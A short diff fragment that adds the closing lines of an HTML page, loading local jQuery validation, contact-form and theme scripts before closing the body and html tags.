+        <script src="assets/mail/jqBootstrapValidation.js"></script>
+        <script src="assets/mail/contact_me.js"></script>
+        <!-- Core theme JS-->
+        <script src="js/scripts.js"></script>
+    </body>
+</html>
